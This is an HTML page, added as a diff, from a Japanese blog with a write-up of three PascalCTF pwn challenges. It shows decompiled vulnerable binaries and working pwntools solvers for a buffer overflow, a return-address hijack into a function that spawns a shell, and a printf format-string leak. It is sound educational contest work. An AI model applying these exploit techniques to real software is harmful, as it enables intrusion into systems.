@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+    <meta name="google-site-verification" content="g4e1f-rfOGwL8eft4txNmLdl2trU4nFIKvIdVoXx6V8" />
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/pascalctf/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/pascalctf/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            
+                <li><a href="https://figaro-san.github.io/links">links</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/pascalctf/">PascalCTF Writeup</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-03-21
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a></span>
+    
+
+        <div class="post-content">
+            <h1 id="korehahe">これは何</h1>
+<p>PascalCTFのwriteupです。例のごとく私はpwnしか解答していません。なんなら開催時間が5時間かつ寝たので3問中1問しか回答できませんでしたが、pwn全問の解答を掲載します。</p>
+<h1 id="morris-worm">Morris Worm</h1>
+<p>接続先とバイナリが配布されます。以下はGhidraの解析結果です。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>undefined8 </span><span style="color:#fad07a;">main</span><span>(</span><span style="color:#8fbfdc;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  EVP_PKEY_CTX *ctx;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> local_38 [</span><span style="color:#cf6a4c;">44</span><span>];
+</span><span>  </span><span style="color:#8fbfdc;">int</span><span> local_c;
+</span><span>  
+</span><span>  signal(</span><span style="color:#cf6a4c;">0xe</span><span>,handle_alarm);
+</span><span>  ctx = (EVP_PKEY_CTX *)</span><span style="color:#cf6a4c;">0x1e</span><span>;
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">0x1e</span><span>);
+</span><span>  </span><span style="color:#ffb964;">init</span><span>(ctx);
+</span><span>  local_c = </span><span style="color:#cf6a4c;">0x45</span><span>;
+</span><span>  puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Do you want to say something?</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fgets(local_38,</span><span style="color:#cf6a4c;">0x539</span><span>,stdin);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(local_c == </span><span style="color:#cf6a4c;">0x539</span><span>) {
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Welcome back Kevin !</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    </span><span style="color:#ffb964;">win</span><span>();
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Bye</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<p>典型的なBOFで、local_cを0x539に上書きするような問題になっていると分かります。</p>
+<p>また、下記はGBDでスタックを覗いた時の結果です。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0x7fffffffe140: 0x0000000000000a41      0x0000000000000000
+</span><span>0x7fffffffe150: 0x0000000000000000      0x00007ffff7fe49f0
+</span><span>                                                +--- これ0x539に書き換えたい
+</span><span>                                                |
+</span><span>0x7fffffffe160: 0x0000000000000000      0x00000045ffffe298
+</span><span>0x7fffffffe170: 0x00007fffffffe210      0x00007ffff7dbb488
+</span></code></pre>
+<p>0x0a41は僕の入力「A\n」です。また0x45がある位置がlocal_cの領域であると分かります。</p>
+<p>よって、44byteの入力バッファの先に上書きしたいlocal_cの値があると分かりました。これを元にsolverを書きます。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./worm</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span style="color:#888888;">#p = process(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">morrisworm.challs.pascalctf.it</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#cf6a4c;">1337</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>
+</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">44
+</span><span>payload += </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x39\x05\x00\x00</span><span style="color:#556633;">&#39;
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<p>フラグ: <code>pascalCTF{y0u_F0uNd-Th3_n3w_mi113n1um-bug???}</code></p>
+<h1 id="unpwnable-shop">Unpwnable_shop</h1>
+<p>接続先とバイナリが貰えるので、またGhidraで解析します(変な変数は私がそう命名しただけ)</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>undefined8 </span><span style="color:#fad07a;">main</span><span>(</span><span style="color:#8fbfdc;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  EVP_PKEY_CTX *ctx;
+</span><span>  </span><span style="color:#8fbfdc;">int</span><span> menu_select;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> name[</span><span style="color:#cf6a4c;">76</span><span>] [</span><span style="color:#cf6a4c;">76</span><span>];
+</span><span>  </span><span style="color:#8fbfdc;">int</span><span> input_size;
+</span><span>  
+</span><span>  signal(</span><span style="color:#cf6a4c;">0xe</span><span>,handle_alarm);
+</span><span>  ctx = (EVP_PKEY_CTX *)</span><span style="color:#cf6a4c;">0x1e</span><span>;
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">0x1e</span><span>);
+</span><span>  </span><span style="color:#ffb964;">init</span><span>(ctx);
+</span><span>  input_size = </span><span style="color:#cf6a4c;">81</span><span>;
+</span><span>  puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Welcome to Unpwnable shop!\n***Now with support for abnormally long usernames!!1!***</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  puts(
+</span><span>      </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">To continue insert your name (don\&#39;t even think about overwriting some return addresses, you ca n\&#39;t lmao) :</span><span style="color:#556633;">&quot;
+</span><span>      );
+</span><span>  fgets(name[</span><span style="color:#cf6a4c;">76</span><span>],input_size,(FILE *)stdin);
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Welcome to the shop </span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n\n\n</span><span style="color:#556633;">&quot;</span><span>,name[</span><span style="color:#cf6a4c;">76</span><span>]);
+</span><span>  </span><span style="color:#ffb964;">printMenu</span><span>();
+</span><span>  scanf(&amp;%d,&amp;menu_select);
+</span><span>  getchar();
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(menu_select != </span><span style="color:#cf6a4c;">0</span><span>) {
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">finding stuff to sell...</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    </span><span style="color:#ffb964;">sleep</span><span>(</span><span style="color:#cf6a4c;">1</span><span>);
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(menu_select == </span><span style="color:#cf6a4c;">69</span><span>) {
+</span><span>      puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">What was your name again? I forgot it.</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      fgets(name[</span><span style="color:#cf6a4c;">76</span><span>],input_size,(FILE *)stdin);
+</span><span>      puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Ok, just hold on while i finish searching.</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      </span><span style="color:#ffb964;">sleep</span><span>(</span><span style="color:#cf6a4c;">2</span><span>);
+</span><span>    }
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">didn\&#39;t find anything :(</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  }
+</span><span>  puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Bye!</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<p>実行したときには分かりませんでしたが、メニュー選択として0か1の入力を要求される時に、69を入力すると、二度目の名前入力を求められる処理へと遷移します。</p>
+<p>ここで、<code>if (menu_select == 69)</code>直前ののスタックを見て見ました。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>                                        menu selec
+</span><span>0x7fffffffe130: 0x000000000000000f      0x00000045 00000000
+</span><span>
+</span><span>				buf
+</span><span>0x7fffffffe140: 0x0000000a41414141      0x000000000009928d
+</span><span>0x7fffffffe150: 0x00007fffffffe180      0x0000000000421d42
+</span><span>0x7fffffffe160: 0x00000000004b83c0      0x00000000004c80e8
+</span><span>0x7fffffffe170: 0x0000000000000000      0x00000000004cf2b8
+</span><span>0x7fffffffe180: 0x00007fffffffe1a0      01 00 00 00 00 | 51 00 00 00
+</span><span>
+</span><span>0x7fffffffe190: 0x00007fffffffe230      0x00000000004037b8
+</span></code></pre>
+<p>0x0a41414141は私の入力「AAAA\n」であり、名前バッファ(name)と分かります。またその76byte先には0x51という数値が存在しており、これは10進数で81です。つまり、nameの先にはinput_sizeが存在していました。</p>
+<p>さらには一度目の名前入力で、76byteのバッファ(name)には81byteの入力が許容されているため、input_sizeを81byteと言わずにリターンアドレスが存在する96byteに変更することもできます。</p>
+<p>こうすれば1回目の81byteの入力ではnameから届かなかったリターンアドレスが、2度目の96byteの名前入力で上書きが可能となります。</p>
+<p>また、win関数も存在していました(下記)</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">win</span><span>(</span><span style="color:#8fbfdc;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffb964;">execve</span><span>(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">/bin/sh</span><span style="color:#556633;">&quot;</span><span>,(</span><span style="color:#8fbfdc;">char </span><span>**)</span><span style="color:#cf6a4c;">0x0</span><span>,(</span><span style="color:#8fbfdc;">char </span><span>**)</span><span style="color:#cf6a4c;">0x0</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>シェルを起動するものなので、この関数アドレスでリターンアドレスを上書きすれば良いと分かります。これらの結果から作成したsolverが以下です。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./unpwnable</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span style="color:#888888;">#p = process(file)
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">unpwnable.challs.pascalctf.it</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">1338</span><span>)
+</span><span>
+</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">76 </span><span>+ </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x62</span><span style="color:#556633;">&#39;
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">stuff\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">69</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvuntil</span><span>(</span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">it.\n</span><span style="color:#556633;">&#39;</span><span>)
+</span><span>
+</span><span>payload = </span><span style="color:#8fbfdc;">b</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">A</span><span style="color:#556633;">&#39;</span><span>*</span><span style="color:#cf6a4c;">88 </span><span>+ </span><span style="color:#ffb964;">p64</span><span>(elf.sym[</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">win</span><span style="color:#556633;">&#39;</span><span>])
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">interactive</span><span>()
+</span></code></pre>
+<p>フラグ: <code>pascalCTF{N0O0o0o@O0_Hòw_D1D_Y0U_D0_17}</code></p>
+<h1 id="e-l-i-a">E.L.I.A</h1>
+<p>バイナリの解析結果は以下。</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span>undefined8 </span><span style="color:#fad07a;">main</span><span>(</span><span style="color:#8fbfdc;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  FILE *flag_fd;
+</span><span>  undefined8 uVar1;
+</span><span>  </span><span style="color:#8fbfdc;">char </span><span>*pcVar2;
+</span><span>  EVP_PKEY_CTX *ctx;
+</span><span>  </span><span style="color:#8fbfdc;">long</span><span> in_FS_OFFSET;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> local_68 [</span><span style="color:#cf6a4c;">38</span><span>];
+</span><span>  undefined local_42;
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> local_38 [</span><span style="color:#cf6a4c;">40</span><span>];
+</span><span>  </span><span style="color:#8fbfdc;">long</span><span> local_10;
+</span><span>  
+</span><span>  local_10 = *(</span><span style="color:#8fbfdc;">long </span><span>*)(in_FS_OFFSET + </span><span style="color:#cf6a4c;">0x28</span><span>);
+</span><span>  signal(</span><span style="color:#cf6a4c;">0xe</span><span>,handle_alarm);
+</span><span>  ctx = (EVP_PKEY_CTX *)</span><span style="color:#cf6a4c;">0x1e</span><span>;
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">0x1e</span><span>);
+</span><span>  </span><span style="color:#ffb964;">init</span><span>(ctx);
+</span><span>  flag_fd = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">flag.txt</span><span style="color:#556633;">&quot;</span><span>,</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(flag_fd == (FILE *)</span><span style="color:#cf6a4c;">0x0</span><span>) {
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Error: File not found</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>    uVar1 = </span><span style="color:#cf6a4c;">1</span><span>;
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    pcVar2 = fgets(local_68,</span><span style="color:#cf6a4c;">0x26</span><span>,flag_fd);
+</span><span>    </span><span style="color:#8fbfdc;">if </span><span>(pcVar2 == (</span><span style="color:#8fbfdc;">char </span><span>*)</span><span style="color:#cf6a4c;">0x0</span><span>) {
+</span><span>      puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Error: Flag file is empty</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      uVar1 = </span><span style="color:#cf6a4c;">1</span><span>;
+</span><span>    }
+</span><span>    </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>      fclose(flag_fd);
+</span><span>      local_42 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>      puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Wow, it actually compiled! Do you want to write something?</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>      fgets(local_38,</span><span style="color:#cf6a4c;">0x1e</span><span>,stdin);
+</span><span>      printf(local_38);
+</span><span>      uVar1 = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(local_10 != *(</span><span style="color:#8fbfdc;">long </span><span>*)(in_FS_OFFSET + </span><span style="color:#cf6a4c;">0x28</span><span>)) {
+</span><span>    </span><span style="color:#888888;">/* WARNING: Subroutine does not return * /
+</span><span style="color:#888888;">    __stack_chk_fail();
+</span><span style="color:#888888;">  }
+</span><span style="color:#888888;">  return uVar1;
+</span><span style="color:#888888;">}
+</span></code></pre>
+<p>FSBが存在しており、かつフラグは読まれてスタックに格納されていることが分かります。<code>%s</code>で読み出そうとするとなんかうまく行かないので<code>%p</code>で0から20番目までの引数を読み出してみたところ、8から12番目に印字可能な数値が続いていました。これを考慮して適当にsolverを書きます。</p>
+<pre data-lang="python" style="background-color:#151515;color:#e8e8d3;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#8fbfdc;">from </span><span>pwn </span><span style="color:#8fbfdc;">import </span><span>*
+</span><span>file = </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">./elia</span><span style="color:#556633;">&#39;
+</span><span>elf = context.binary = </span><span style="color:#ffb964;">ELF</span><span>(file)
+</span><span>
+</span><span>p = </span><span style="color:#ffb964;">remote</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">elia.challs.pascalctf.it</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#cf6a4c;">1339</span><span>)
+</span><span>p.</span><span style="color:#ffb964;">recvline</span><span>()
+</span><span>
+</span><span>payload = </span><span style="color:#556633;">&#39;&#39;
+</span><span style="color:#8fbfdc;">for </span><span>i </span><span style="color:#8fbfdc;">in </span><span style="color:#ffb964;">range</span><span>(</span><span style="color:#cf6a4c;">8</span><span>, </span><span style="color:#cf6a4c;">13</span><span>):
+</span><span>    payload += </span><span style="color:#8fbfdc;">f</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">%</span><span>{i}</span><span style="color:#99ad6a;">$p</span><span style="color:#556633;">&#39;
+</span><span>
+</span><span>p.</span><span style="color:#ffb964;">sendline</span><span>(payload)
+</span><span>
+</span><span>flag = [</span><span style="color:#ffb964;">int</span><span>(i, </span><span style="color:#cf6a4c;">16</span><span>) </span><span style="color:#8fbfdc;">for </span><span>i </span><span style="color:#8fbfdc;">in </span><span>p.</span><span style="color:#ffb964;">recvline</span><span>().</span><span style="color:#ffb964;">decode</span><span>().</span><span style="color:#ffb964;">split</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">0x</span><span style="color:#556633;">&#39;</span><span>)[</span><span style="color:#cf6a4c;">1</span><span>:]]
+</span><span>pascal = </span><span style="color:#556633;">&#39;&#39;
+</span><span style="color:#8fbfdc;">for </span><span>i </span><span style="color:#8fbfdc;">in </span><span>flag:
+</span><span>    pascal += i.</span><span style="color:#ffb964;">to_bytes</span><span>(</span><span style="color:#cf6a4c;">8</span><span>, </span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">little</span><span style="color:#556633;">&#39;</span><span>).</span><span style="color:#ffb964;">decode</span><span>()
+</span><span>
+</span><span>pascal = pascal.</span><span style="color:#ffb964;">replace</span><span>(</span><span style="color:#556633;">&#39;</span><span style="color:#99ad6a;">\x00</span><span style="color:#556633;">&#39;</span><span>, </span><span style="color:#556633;">&#39;&#39;</span><span>)
+</span><span style="color:#ffb964;">print</span><span>(pascal)
+</span><span>
+</span></code></pre>
+<p>フラグ: <code>pascalCTF{n0_pr1ntf-vulns-n0_fun@4ll}</code></p>
+<h1 id="zui-hou-ni">最後に</h1>
+<p>CTFは日本時間だと深夜開催(0-5時)。その日は予定があることを忘れており、結局寝ました。</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/picoctf-2025/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">picoCTF 2025 Writeup</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://figaro-san.github.io/home-network/">
+                                <span class="button__text">私のおうちネットワーク環境</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
